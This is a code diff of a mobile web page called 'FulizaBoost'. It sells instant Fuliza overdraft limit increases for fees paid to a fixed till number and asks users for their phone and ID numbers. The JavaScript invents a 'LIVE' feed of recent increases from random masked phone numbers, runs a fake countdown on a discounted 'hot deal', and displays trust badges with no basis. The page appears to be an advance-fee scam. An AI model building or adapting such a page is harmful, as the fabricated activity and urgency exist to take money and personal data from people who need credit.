+    .progress .step-2 { background: var(--accent); }
+    .progress .step-3 { background: var(--primary); }
+
+    .title {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 1.1rem;
+      font-weight: 700;
+      color: var(--primary);
+      margin-bottom: 16px;
+      line-height: 1.3;
+    }
+
+    .title i {
+      font-size: 1.3rem;
+    }
+
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 10px;
+      margin-bottom: 16px;
+    }
+
+    .loan-box {
+      background: linear-gradient(180deg, #ffffff 0%, #f8f9f7 100%);
+      border: 2px solid var(--border-color);
+      border-radius: 12px;
+      padding: 12px 8px;
+      text-align: center;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      user-select: none;
+      min-height: 80px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+    }
+
+    .loan-box:hover {
+      transform: translateY(-2px);
+      box-shadow: var(--shadow-md);
+      border-color: var(--primary);
+    }
+
+    .loan-box.selected {
+      border-color: var(--primary);
+      background: linear-gradient(180deg, rgba(31, 122, 31, 0.1) 0%, rgba(31, 122, 31, 0.05) 100%);
+      box-shadow: 0 4px 12px rgba(31, 122, 31, 0.15);
+      transform: translateY(-2px) scale(1.01);
+      cursor: default;
+    }
+
+    .loan-box.hot-highlight {
+      border-color: var(--gold);
+      background: linear-gradient(180deg, rgba(245, 158, 11, 0.08) 0%, rgba(245, 158, 11, 0.02) 100%);
+      box-shadow: 0 0 0 2px rgba(245, 158, 11, 0.15);
+    }
+
+    .loan-box.hot-highlight.selected {
+      border-color: var(--gold);
+      box-shadow: 0 4px 16px rgba(245, 158, 11, 0.25);
+    }
+
+    .hot-tag {
+      position: absolute;
+      top: -6px;
+      right: -6px;
+      background: var(--gold);
+      color: #fff;
+      font-size: 0.5rem;
+      font-weight: 700;
+      padding: 2px 8px;
+      border-radius: 999px;
+      text-transform: uppercase;
+      letter-spacing: 0.3px;
+      box-shadow: 0 2px 6px rgba(245, 158, 11, 0.3);
+    }
+
+    .amount {
+      font-size: 1.05rem;
+      font-weight: 800;
+      color: var(--primary);
+      margin-bottom: 2px;
+      transition: all 0.3s ease;
+      line-height: 1.2;
+    }
+
+    .loan-box.selected .amount {
+      color: var(--primary-dark);
+      font-size: 1.1rem;
+    }
+
+    .fee {
+      display: inline-block;
+      padding: 3px 10px;
+      background: #eef1ee;
+      border-radius: 999px;
+      font-size: 0.7rem;
+      font-weight: 600;
+      color: var(--text-muted);
+      transition: all 0.3s ease;
+      line-height: 1.4;
+    }
+
+    .loan-box.selected .fee {
+      background: var(--primary);
+      color: white;
+    }
+
+    .loan-box.hot-highlight .fee {
+      background: var(--gold-light);
+      color: #92400e;
+    }
+
+    .fee .original-fee {
+      text-decoration: line-through;
+      color: #999;
+      font-weight: 400;
+      margin-right: 4px;
+    }
+
+    .fee .deal-fee {
+      color: var(--accent);
+      font-weight: 700;
+    }
+
+    .get-btn-inline {
+      background: linear-gradient(90deg, var(--primary) 0%, var(--primary-dark) 100%);
+      border: none;
+      border-radius: 999px;
+      color: #fff;
+      font-weight: 700;
+      font-size: 0.7rem;
+      padding: 4px 14px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      box-shadow: 0 2px 8px rgba(31, 122, 31, 0.3);
+      margin-top: 4px;
+      display: none;
+      width: 100%;
+      max-width: 110px;
+      letter-spacing: 0.3px;
+    }
+
+    .loan-box.selected .get-btn-inline {
+      display: block;
+    }
+
+    .get-btn-inline:hover {
+      transform: scale(1.04);
+      box-shadow: 0 4px 12px rgba(31, 122, 31, 0.4);
+    }
+    .get-btn-inline:active {
+      transform: scale(0.96);
+    }
+
+    .loan-box.hot-highlight .get-btn-inline {
+      background: var(--gold);
+      box-shadow: 0 2px 8px rgba(245, 158, 11, 0.4);
+    }
+
+    .cta {
+      background: linear-gradient(90deg, var(--primary) 0%, var(--primary-dark) 100%);
+      border-radius: 999px;
+      padding: 15px;
+      text-align: center;
+      color: #fff;
+      font-size: 1rem;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      box-shadow: 0 6px 15px rgba(31, 122, 31, 0.3);
+      border: none;
+      width: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .cta:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 20px rgba(31, 122, 31, 0.4);
+    }
+
+    .cta:active {
+      transform: translateY(0);
+      box-shadow: 0 4px 10px rgba(31, 122, 31, 0.3);
+    }
+
+    .cta.disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      transform: none !important;
+      box-shadow: none !important;
+    }
+
+    .trust-badges {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 8px;
+      margin-top: 4px;
+      padding: 0 2px;
+    }
+
+    .badge {
+      background: linear-gradient(180deg, rgba(31, 122, 31, 0.05) 0%, rgba(31, 122, 31, 0.02) 100%);
+      border: 1px solid var(--border-color);
+      border-radius: 999px;
+      padding: 6px 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      font-size: 0.65rem;
+      color: var(--text-muted);
+      text-align: center;
+      line-height: 1.2;
+    }
+
+    .badge i {
+      color: var(--primary);
+      font-size: 0.75rem;
+    }
+
+    .input-container {
+      padding: 8px 0;
+      text-align: center;
+    }
+
+    .input-section-title {
+      font-size: 0.85rem;
+      color: var(--text-muted);
+      margin-bottom: 12px;
+      text-align: center;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      line-height: 1.3;
+    }
+
+    .input-wrapper {
+      margin-bottom: 14px;
+    }
+
+    .input-label {
+      display: block;
+      font-size: 0.75rem;
+      font-weight: 600;
+      color: var(--primary);
+      margin-bottom: 4px;
+      text-align: left;
+      padding-left: 2px;
+      line-height: 1.2;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 10px 12px;
+      border: 2px solid var(--border-color);
+      border-radius: 10px;
+      font-size: 0.9rem;
+      font-weight: 500;
+      outline: none;
+      background: white;
+      transition: all 0.2s ease;
+    }
+
+    .input-field:focus {
+      border-color: var(--primary);
+      box-shadow: 0 0 0 2px rgba(31, 122, 31, 0.1);
+    }
+
+    .input-field::placeholder {
+      color: #a0a0a0;
+      font-size: 0.85rem;
+    }
+
+    .phone-input-with-prefix {
+      display: flex;
+      width: 100%;
+      border: 2px solid var(--border-color);
+      border-radius: 10px;
+      overflow: hidden;
+      transition: all 0.2s ease;
+    }
+
+    .phone-input-with-prefix:focus-within {
+      border-color: var(--primary);
+      box-shadow: 0 0 0 2px rgba(31, 122, 31, 0.1);
+    }
+
+    .phone-prefix {
+      background: #f8f9f7;
+      padding: 10px 12px;
+      font-weight: 600;
+      color: var(--text-dark);
+      border-right: 2px solid var(--border-color);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-width: 70px;
+      font-size: 0.85rem;
+    }
+
+    .phone-input-field {
+      flex: 1;
+      padding: 10px 12px;
+      border: none;
+      font-size: 0.9rem;
+      font-weight: 500;
+      outline: none;
+      background: white;
+      min-width: 0;
+    }
+
+    .input-note-modal {
+      font-size: 0.7rem;
+      color: var(--text-muted);
+      text-align: center;
+      margin-top: 10px;
+      background: #f8f9f7;
+      padding: 8px;
+      border-radius: 8px;
+      line-height: 1.3;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    @keyframes pulse {
+      0% { box-shadow: 0 0 0 0 rgba(31, 122, 31, 0.4); }
+      70% { box-shadow: 0 0 0 8px rgba(31, 122, 31, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(31, 122, 31, 0); }
+    }
+
+    .pulse {
+      animation: pulse 2s infinite;
+    }
+
+    /* manual payment fallback styles */
+    .manual-payment-box {
+      background: #fef9e3;
+      border-left: 4px solid #f59e0b;
+      padding: 16px;
+      border-radius: 16px;
+      margin: 12px 0;
+      text-align: left;
+    }
+
+    .manual-payment-box i {
+      color: #f59e0b;
+      margin-right: 6px;
+    }
+
+    .copy-till {
+      display: flex;
+      gap: 8px;
+      align-items: center;
+      background: white;
+      padding: 8px 12px;
+      border-radius: 40px;
+      margin: 12px 0;
+      border: 1px solid var(--border-color);
+      flex-wrap: wrap;
+    }
+
+    .till-number {
+      font-family: 'Courier New', monospace;
+      font-size: 1.2rem;
+      font-weight: 700;
+      background: #f3f4f6;
+      padding: 6px 14px;
+      border-radius: 40px;
+      letter-spacing: 1px;
+      color: var(--primary);
+    }
+
+    .copy-btn-sm {
+      background: var(--primary);
+      color: #fff;
+      border: none;
+      padding: 6px 16px;
+      border-radius: 40px;
+      font-weight: 600;
+      font-size: 0.75rem;
+      cursor: pointer;
+      transition: 0.2s;
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    .copy-btn-sm:hover {
+      transform: scale(1.04);
+      box-shadow: 0 2px 8px rgba(31, 122, 31, 0.25);
+    }
+
+    .manual-input-group {
+      margin-top: 12px;
+    }
+
+    .manual-input-group label {
+      display: block;
+      font-size: 0.75rem;
+      font-weight: 600;
+      color: var(--text-muted);
+      margin-bottom: 4px;
+    }
+
+    .manual-input-group textarea {
+      width: 100%;
+      padding: 10px 12px;
+      border: 2px solid var(--border-color);
+      border-radius: 10px;
+      font-size: 0.8rem;
+      font-family: inherit;
+      resize: vertical;
+      min-height: 60px;
+      outline: none;
+      transition: border 0.2s, box-shadow 0.2s;
+      background: white;
+    }
+
+    .manual-input-group textarea:focus {
+      border-color: var(--primary);
+      box-shadow: 0 0 0 2px rgba(31, 122, 31, 0.1);
+    }
+
+    .manual-input-group textarea.error {
+      border-color: #ef4444 !important;
+      box-shadow: 0 0 0 2px rgba(239, 68, 68, 0.2) !important;
+    }
+
+    .manual-input-group .error-msg {
+      color: #ef4444;
+      font-size: 0.7rem;
+      margin-top: 4px;
+      display: none;
+    }
+
+    .manual-input-group .error-msg.show {
+      display: block;
+    }
+
+    .manual-actions {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      margin-top: 14px;
+    }
+
+    .manual-actions .btn-primary {
+      background: linear-gradient(90deg, var(--primary) 0%, var(--primary-dark) 100%);
+      border: none;
+      border-radius: 999px;
+      padding: 12px;
+      color: #fff;
+      font-weight: 700;
+      font-size: 0.9rem;
+      cursor: pointer;
+      transition: 0.2s;
+      box-shadow: 0 2px 8px rgba(31, 122, 31, 0.2);
+      width: 100%;
+    }
+
+    .manual-actions .btn-primary:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 4px 12px rgba(31, 122, 31, 0.35);
+    }
+
+    .manual-actions .btn-secondary {
+      background: #f3f4f6;
+      border: 1px solid var(--border-color);
+      border-radius: 999px;
+      padding: 12px;
+      color: var(--text-muted);
+      font-weight: 600;
+      font-size: 0.85rem;
+      cursor: pointer;
+      transition: 0.2s;
+      width: 100%;
+    }
+
+    .manual-actions .btn-secondary:hover {
+      background: #e5e7eb;
+    }
+
+    /* Small phones */
+    @media (max-width: 360px) {
+      html { font-size: 13px; }
+      body { padding: 10px; }
+      .logo { font-size: 1.4rem; }
+      .card { padding: 14px; }
+      .grid { gap: 8px; }
+      .loan-box { padding: 10px 6px; min-height: 72px; }
+      .amount { font-size: 0.95rem; }
+      .hot-deal { flex-direction: column; align-items: stretch; }
+      .hot-deal-left { justify-content: center; }
+      .hot-deal-right { justify-content: center; }
+      .hot-deal-btn { width: 100%; justify-content: center; }
+      .cta { padding: 13px; font-size: 0.9rem; }
+    }
+
+    @media (max-height: 500px) and (orientation: landscape) {
+      .grid { grid-template-columns: repeat(3, 1fr); }
+      .loan-box { min-height: 65px; }
+      .hot-deal { padding: 10px 14px; }
+      .feed-card { padding: 8px 12px; }
+    }
+
+    @media (min-width: 480px) {
+      body { padding: 16px; }
+      .container { max-width: 440px; margin: 0 auto; }
+      .logo { font-size: 1.8rem; }
+      .card { padding: 20px; }
+      .loan-box { padding: 14px 12px; min-height: 90px; }
+      .amount { font-size: 1.1rem; }
+    }
+
+    .swal2-popup {
+      border-radius: 16px !important;
+      padding: 20px !important;
+      max-width: 92% !important;
+      width: auto !important;
+      margin: 0 10px !important;
+    }
+
+    .swal2-title {
+      color: var(--primary) !important;
+      font-weight: 700 !important;
+      font-size: 1.1rem !important;
+      margin-bottom: 10px !important;
+      line-height: 1.3 !important;
+    }
+
+    .swal2-html-container {
+      margin: 0 !important;
+      padding: 0 !important;
+    }
+
+    .swal2-confirm {
+      background: linear-gradient(90deg, var(--primary), var(--primary-dark)) !important;
+      border-radius: 10px !important;
+      font-weight: 600 !important;
+      padding: 12px 24px !important;
+      font-size: 0.9rem !important;
+      margin-top: 10px !important;
+      width: 100% !important;
+    }
+
+    .swal2-cancel {
+      background: #f8f9f7 !important;
+      border: 2px solid var(--border-color) !important;
+      border-radius: 10px !important;
+      color: var(--text-muted) !important;
+      font-weight: 500 !important;
+      padding: 12px 24px !important;
+      font-size: 0.9rem !important;
+      margin-top: 6px !important;
+      width: 100% !important;
+    }
+
+    .swal2-actions {
+      flex-direction: column !important;
+      width: 100% !important;
+      margin-top: 14px !important;
+    }
+
+    .payment-confirm-content {
+      padding: 0 4px;
+      text-align: center;
+    }
+    .payment-confirm-icon {
+      font-size: 2.2rem !important;
+      color: var(--primary);
+      margin-bottom: 10px;
+    }
+    .payment-details-box {
+      background: #f8f9f7;
+      padding: 10px;
+      border-radius: 10px;
+      margin-bottom: 12px;
+    }
+    .payment-detail-row {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 6px;
+      font-size: 0.85rem;
+    }
+    .payment-detail-row:last-child { margin-bottom: 0; }
+    .payment-phone-note {
+      color: #666;
+      font-size: 0.75rem;
+      margin-top: 8px;
+      line-height: 1.3;
+    }
+
+    .stk-push-content {
+      text-align: center;
+      padding: 0 4px;
+    }
+    .stk-push-icon {
+      font-size: 2.2rem !important;
+      color: var(--primary);
+      margin-bottom: 10px;
+    }
+    .stk-phone-display {
+      background: #f8f9f7;
+      padding: 8px;
+      border-radius: 8px;
+      margin: 10px 0;
+      font-weight: 600;
+      font-size: 0.9rem;
+    }
+
+    .success-icon {
+      font-size: 2.8rem !important;
+      color: #22c55e;
+      margin-bottom: 10px;
+    }
+    .error-icon {
+      font-size: 2.2rem !important;
+      color: #f59e0b;
+      margin-bottom: 10px;
+    }
+
+    /* Loading spinner override for empty text */
+    .swal2-loading {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    /* Toast notification for copy */
+    .toast-copy {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #1f2937;
+      color: white;
+      padding: 10px 24px;
+      border-radius: 40px;
+      font-size: 0.85rem;
+      font-weight: 500;
+      z-index: 9999;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.3s, visibility 0.3s;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+      pointer-events: none;
+    }
+    .toast-copy.show {
+      opacity: 1;
+      visibility: visible;
+    }
+  </style>
 </head>
 <body>
 
-    <div class="container">
+  <div class="container">
 
-        <!-- Toast for copy -->
-        <div id="toastCopy" class="toast-copy">Till number copied!</div>
+    <!-- Toast for copy -->
+    <div id="toastCopy" class="toast-copy">Till number copied!</div>
 
-        <!-- Header -->
-        <div class="header">
-            <div class="logo">Fuliza<span>Boost</span></div>
-            <p class="subtitle">Instant Limit Increase • No Paperwork • Same Day Access</p>
+    <!-- Header -->
+    <div class="header">
+      <div class="logo">Fuliza<span>Boost</span></div>
+      <p class="subtitle">Instant Limit Increase • No Paperwork • Same Day Access</p>
+    </div>
+
+    <!-- Info Box -->
+    <div class="info-box">
+      <i class="fas fa-info-circle"></i>
+      Choose your new Fuliza limit and complete the payment to get instant access.
+    </div>
+
+    <!-- Recent Increases Feed Card -->
+    <div class="feed-card">
+      <div class="feed-header">
+        <i class="fas fa-chart-line"></i> Recent Increases
+        <span class="live-badge">LIVE</span>
+      </div>
+      <div class="feed-container">
+        <div class="feed-icon"><i class="fas fa-bolt"></i></div>
+        <div class="feed-content">
+          <div class="feed-text" id="feedText">Loading latest increases...</div>
         </div>
+      </div>
+    </div>
 
-        <!-- Info Box -->
-        <div class="info-box">
-            <i class="fas fa-info-circle"></i>
-            Choose your new Fuliza limit and complete the payment to get instant access.
+    <!-- Today's Hot Deal Banner -->
+    <div class="hot-deal" id="hotDealBanner">
+      <div class="hot-deal-left">
+        <span class="hot-badge"><i class="fas fa-fire"></i> Today's Hot Deal</span>
+        <span class="hot-title">Ksh 50,000 Limit</span>
+        <span class="hot-timer">
+          <i class="far fa-clock"></i>
+          <span class="countdown" id="countdownTimer">2h 47m</span>
+        </span>
+      </div>
+      <div class="hot-deal-right">
+        <div class="hot-price">
+          <span class="original-price">Ksh 960</span>
+          <span class="deal-price">Ksh 500</span>
         </div>
+        <button class="hot-deal-btn" id="hotDealBtn">
+          <i class="fas fa-bolt"></i> Grab Deal
+        </button>
+      </div>
+    </div>
 
-        <!-- Recent Increases Feed Card -->
-        <div class="feed-card">
-            <div class="feed-header">
-                <i class="fas fa-chart-line"></i> Recent Increases
-                <span class="live-badge">LIVE</span>
-            </div>
-            <div class="feed-container">
-                <div class="feed-icon"><i class="fas fa-bolt"></i></div>
-                <div class="feed-content">
-                    <div class="feed-text" id="feedText">Loading latest increases...</div>
-                </div>
-            </div>
-        </div>
+    <!-- Main Card -->
+    <div class="card" style="animation: fadeIn 0.6s ease-out;">
 
-        <!-- Today's Hot Deal Banner -->
-        <div class="hot-deal" id="hotDealBanner">
-            <div class="hot-deal-left">
-                <span class="hot-badge"><i class="fas fa-fire"></i> Today's Hot Deal</span>
-                <span class="hot-title" id="hotDealTitle">Ksh 50,000 Limit</span>
-                <span class="hot-timer">
-                    <i class="far fa-clock"></i>
-                    <span class="countdown" id="countdownTimer">--:--:--</span>
-                </span>
-            </div>
-            <div class="hot-deal-right">
-                <div class="hot-price">
-                    <span class="original-price" id="hotOriginalPrice">Ksh 5,000</span>
-                    <span class="deal-price" id="hotDealPrice">Ksh 3,500</span>
-                </div>
-                <button class="hot-deal-btn" id="hotDealBtn">
-                    <i class="fas fa-bolt"></i> Grab Deal
-                </button>
-            </div>
-        </div>
+      <!-- Progress Bar -->
+      <div class="progress">
+        <div class="step-1"></div>
+        <div class="step-2"></div>
+        <div class="step-3"></div>
+      </div>
 
-        <!-- Main Card -->
-        <div class="card" style="animation: fadeIn 0.6s ease-out;">
+      <!-- Title -->
+      <div class="title">
+        <i class="fas fa-wallet"></i>
+        Select Your Fuliza Limit
+      </div>
 
-            <!-- Progress Bar -->
-            <div class="progress">
-                <div class="step-1"></div>
-                <div class="step-2"></div>
-                <div class="step-3"></div>
-            </div>
+      <!-- Loan Grid -->
+      <div class="grid" id="loan-grid">
+        <!-- Populated by JavaScript -->
+      </div>
 
-            <!-- Title -->
-            <div class="title">
-                <i class="fas fa-wallet"></i>
-                Select Your Fuliza Limit
-            </div>
-
-            <!-- Loan Grid -->
-            <div class="grid" id="loan-grid">
-                <!-- Populated by JavaScript -->
-            </div>
-
-            <!-- CTA Button -->
-            <button class="cta disabled" id="get-limit-btn">
-                <i class="fas fa-bolt"></i> Get Limit Now
-            </button>
-
-        </div>
-
-        <!-- Trust Badges -->
-        <div class="trust-badges">
-            <div class="badge"><i class="fas fa-lock"></i> Secure</div>
-            <div class="badge"><i class="fas fa-shield-alt"></i> Encrypted</div>
-            <div class="badge"><i class="fas fa-bolt"></i> Instant</div>
-            <div class="badge"><i class="fas fa-check-circle"></i> Verified</div>
-        </div>
+      <!-- CTA Button -->
+      <button class="cta disabled" id="get-limit-btn">
+        <i class="fas fa-bolt"></i> Get Limit Now
+      </button>
 
     </div>
 
-    <!-- SweetAlert2 -->
-    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.all.min.js">
-    </script>
+    <!-- Trust Badges -->
+    <div class="trust-badges">
+      <div class="badge"><i class="fas fa-lock"></i> Secure</div>
+      <div class="badge"><i class="fas fa-shield-alt"></i> Encrypted</div>
+      <div class="badge"><i class="fas fa-bolt"></i> Instant</div>
+      <div class="badge"><i class="fas fa-check-circle"></i> Verified</div>
+    </div>
 
-    <script>
-        // ─── CONFIGURATION ────────────────────────────────────────────────
-        const API_ENDPOINTS = {
-            initiatePayment: '/api/initiate-payment',
-            verifyPayment: '/api/verify-payment',
-            normalizePhone: '/api/normalize-phone'
-        };
+  </div>
 
-        const TILL_NUMBER = '1692733';
+  <!-- SweetAlert2 -->
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.all.min.js">
+  </script>
 
-        // ─── HOT DEAL (single source of truth) ──────────────────────────
-        const HOT_DEAL = {
-            amount: 50000,
-            fee: 3500,
-            originalFee: 5000,
-            saving: 1500
-        };
+  <script>
+    // ─── CONFIGURATION ────────────────────────────────────────────────
+const API_ENDPOINTS = {
+  initiatePayment: '/api/initiate-payment',
+  verifyPayment: '/api/verify-payment',
+  normalizePhone: '/api/normalize-phone'
+};
 
-        // ─── ALL LOAN OPTIONS ────────────────────────────────────────────
-        // The hot deal entry MUST have amount === HOT_DEAL.amount and isHot: true
-        const loanOptions = [
-            { amount: 5000, fee: 99 },
-            { amount: 10000, fee: 250 },
-            { amount: 15000, fee: 500 },
-            { amount: 20000, fee: 1000 },
-            { amount: 25000, fee: 1500 },
-            { amount: 30000, fee: 2500 },
-            { amount: 35000, fee: 3500 },
-            // ─── HOT DEAL ──────────────────────────────────────────────
-            { amount: HOT_DEAL.amount, fee: HOT_DEAL.fee, originalFee: HOT_DEAL.originalFee, isHot: true },
-            { amount: 55000, fee: 6000 },
-            { amount: 70000, fee: 7500 }
-        ];
+const TILL_NUMBER = '1692733';
 
-        // ─── GENERATE 30 FEED ENTRIES ──────────────────────────────────────
-        function generateFeedEntries() {
-            const entries = [];
-            const now = Date.now();
+// The Hot Deal package
+const HOT_DEAL = {
+  amount: 50000,
+  fee: 500,
+  originalFee: 960,
+  saving: 460
+};
 
-            const phones = [
-                '0712', '0723', '0710', '0725', '0722', '0728', '0711', '0713', '0727', '0706',
-                '0715', '0720', '0716', '0729', '0708', '0718', '0721', '0705', '0719', '0724',
-                '0714', '0726', '0709', '0717', '0707'
-            ];
+// All loan options
+const loanOptions = [
+  { amount: 10000, fee: 100 },
+  { amount: 12500, fee: 130 },
+  { amount: 16000, fee: 180 },
+  { amount: 21000, fee: 200 },
+  { amount: 25500, fee: 220 },
+  { amount: 30000, fee: 350 },
+  { amount: 35000, fee: 420 },
+  { amount: 40000, fee: 540 },
+  { amount: 45000, fee: 680 },
+  { amount: 50000, fee: 500, originalFee: 960, isHot: true },
+  { amount: 60000, fee: 1550 },
+  { amount: 70000, fee: 2000 }
+];
 
-            function randomPhone() {
-                const prefix = phones[Math.floor(Math.random() * phones.length)];
-                const last4 = String(Math.floor(1000 + Math.random() * 9000));
-                return prefix + '****' + last4;
-            }
+// ─── GENERATE 30 FEED ENTRIES ──────────────────────────────────────
+function generateFeedEntries() {
+  const entries = [];
+  const now = Date.now();
 
-            function randomTime() {
-                const mins = Math.floor(Math.random() * 5);
-                const secs = Math.floor(Math.random() * 60);
-                return mins * 60 + secs;
-            }
+  const phones = [
+    '0712', '0723', '0710', '0725', '0722', '0728', '0711', '0713', '0727', '0706',
+    '0715', '0720', '0716', '0729', '0708', '0718', '0721', '0705', '0719', '0724',
+    '0714', '0726', '0709', '0717', '0707'
+  ];
 
-            function formatTime(secondsAgo) {
-                if (secondsAgo < 60) return 'just now';
-                if (secondsAgo < 120) return '1 min ago';
-                const mins = Math.floor(secondsAgo / 60);
-                return mins + ' mins ago';
-            }
+  function randomPhone() {
+    const prefix = phones[Math.floor(Math.random() * phones.length)];
+    const last4 = String(Math.floor(1000 + Math.random() * 9000));
+    return prefix + '****' + last4;
+  }
 
-            const hotAmounts = [HOT_DEAL.amount];
-            const highAmounts = [40000, 45000, 60000, 70000];
-            const lowAmounts = [10000, 12500, 16000, 21000, 25500, 30000, 35000];
+  function randomTime() {
+    const mins = Math.floor(Math.random() * 5);
+    const secs = Math.floor(Math.random() * 60);
+    return mins * 60 + secs;
+  }
 
-            for (let i = 0; i < 12; i++) {
-                const amt = hotAmounts[0];
-                const secs = randomTime();
-                entries.push({ phone: randomPhone(), amount: amt, time: secs, timeLabel: formatTime(secs),
-                    timestamp: now - secs * 1000, isHot: true });
-            }
-            for (let i = 0; i < 13; i++) {
-                const amt = highAmounts[Math.floor(Math.random() * highAmounts.length)];
-                const secs = randomTime();
-                entries.push({ phone: randomPhone(), amount: amt, time: secs, timeLabel: formatTime(secs),
-                    timestamp: now - secs * 1000, isHot: false });
-            }
-            for (let i = 0; i < 5; i++) {
-                const amt = lowAmounts[Math.floor(Math.random() * lowAmounts.length)];
-                const secs = randomTime();
-                entries.push({ phone: randomPhone(), amount: amt, time: secs, timeLabel: formatTime(secs),
-                    timestamp: now - secs * 1000, isHot: false });
-            }
+  function formatTime(secondsAgo) {
+    if (secondsAgo < 60) return 'just now';
+    if (secondsAgo < 120) return '1 min ago';
+    const mins = Math.floor(secondsAgo / 60);
+    return mins + ' mins ago';
+  }
 
-            for (let i = entries.length - 1; i > 0; i--) {
-                const j = Math.floor(Math.random() * (i + 1));
-                [entries[i], entries[j]] = [entries[j], entries[i]];
-            }
-            return entries;
+  const hotAmounts = [50000];
+  const highAmounts = [40000, 45000, 60000, 70000];
+  const lowAmounts = [10000, 12500, 16000, 21000, 25500, 30000, 35000];
+
+  for (let i = 0; i < 12; i++) {
+    const amt = hotAmounts[0];
+    const secs = randomTime();
+    entries.push({ phone: randomPhone(), amount: amt, time: secs, timeLabel: formatTime(secs),
+      timestamp: now - secs * 1000, isHot: true });
+  }
+  for (let i = 0; i < 13; i++) {
+    const amt = highAmounts[Math.floor(Math.random() * highAmounts.length)];
+    const secs = randomTime();
+    entries.push({ phone: randomPhone(), amount: amt, time: secs, timeLabel: formatTime(secs),
+      timestamp: now - secs * 1000, isHot: false });
+  }
+  for (let i = 0; i < 5; i++) {
+    const amt = lowAmounts[Math.floor(Math.random() * lowAmounts.length)];
+    const secs = randomTime();
+    entries.push({ phone: randomPhone(), amount: amt, time: secs, timeLabel: formatTime(secs),
+      timestamp: now - secs * 1000, isHot: false });
+  }
+
+  for (let i = entries.length - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    [entries[i], entries[j]] = [entries[j], entries[i]];
+  }
+  return entries;
+}
+
+// ─── STATE ────────────────────────────────────────────────────────
+let selectedLoan = null;
+let phoneNumber = '';
+let idNumber = '';
+let paymentReference = null;
+let isProcessing = false;
+let feedEntries = [];
+let feedIndex = 0;
+let feedInterval = null;
+let countdownInterval = null;
+let countdownSeconds = 3 * 3600;
+let pendingRetryData = null;
+
+const loanGrid = document.getElementById('loan-grid');
+const getLimitBtn = document.getElementById('get-limit-btn');
+const feedText = document.getElementById('feedText');
+const countdownEl = document.getElementById('countdownTimer');
+const hotDealBtn = document.getElementById('hotDealBtn');
+
+// ─── TOAST HELPER ──────────────────────────────────────────────────
+function showToast(message, duration = 2000) {
+  const toast = document.getElementById('toastCopy');
+  toast.textContent = message;
+  toast.classList.add('show');
+  setTimeout(() => toast.classList.remove('show'), duration);
+}
+
+// ─── INIT ──────────────────────────────────────────────────────────
+function init() {
+  feedEntries = generateFeedEntries();
+  renderLoanOptions();
+  startFeed();
+  startCountdown();
+  setupEventListeners();
+  restoreFromStorage();
+  updateButtonState();
+  if (selectedLoan) highlightHotDeal();
+}
+
+// ─── RENDER LOAN GRID ─────────────────────────────────────────────
+function renderLoanOptions() {
+  loanGrid.innerHTML = '';
+  loanOptions.forEach((loan, index) => {
+    const loanBox = document.createElement('div');
+    loanBox.className = 'loan-box';
+    if (loan.isHot) loanBox.classList.add('hot-highlight');
+    loanBox.dataset.index = index;
+    loanBox.dataset.amount = loan.amount;
+    loanBox.dataset.fee = loan.fee;
+
+    const hotTag = loan.isHot ? '<span class="hot-tag">🔥 Deal</span>' : '';
+    let feeHtml = '';
+    if (loan.isHot) {
+      feeHtml =
+        `<div class="fee"><span class="original-fee">Ksh ${loan.originalFee}</span> <span class="deal-fee">Ksh ${loan.fee}</span></div>`;
+    } else {
+      feeHtml = `<div class="fee">Fee: Ksh ${loan.fee}</div>`;
+    }
+
+    loanBox.innerHTML = `
+              ${hotTag}
+              <div class="amount">Ksh ${loan.amount.toLocaleString()}</div>
+              ${feeHtml}
+              <button class="get-btn-inline">Get Now</button>
+            `;
+
+    loanBox.addEventListener('click', () => selectLoan(loanBox, loan));
+    const btn = loanBox.querySelector('.get-btn-inline');
+    btn.addEventListener('click', function(e) {
+      e.stopPropagation();
+      if (selectedLoan && selectedLoan.amount === loan.amount) {
+        showIdPhoneModal();
+      }
+    });
+    loanGrid.appendChild(loanBox);
+  });
+}
+
+// ─── SELECT LOAN ──────────────────────────────────────────────────
+function selectLoan(loanBox, loan) {
+  document.querySelectorAll('.loan-box').forEach(b => b.classList.remove('selected'));
+  loanBox.classList.add('selected');
+  selectedLoan = loan;
+  updateButtonState();
+  saveToStorage();
+  loanBox.classList.add('pulse');
+  setTimeout(() => loanBox.classList.remove('pulse'), 2000);
+}
+
+// ─── UPDATE BUTTON ────────────────────────────────────────────────
+function updateButtonState() {
+  const valid = selectedLoan !== null;
+  getLimitBtn.classList.toggle('disabled', !valid);
+  getLimitBtn.disabled = !valid;
+  if (valid) {
+    getLimitBtn.innerHTML = `<i class="fas fa-bolt"></i> Get Ksh ${selectedLoan.amount.toLocaleString()} Now`;
+  } else {
+    getLimitBtn.innerHTML = `<i class="fas fa-bolt"></i> Get Limit Now`;
+  }
+}
+
+// ─── FEED ROTATION ─────────────────────────────────────────────────
+function startFeed() {
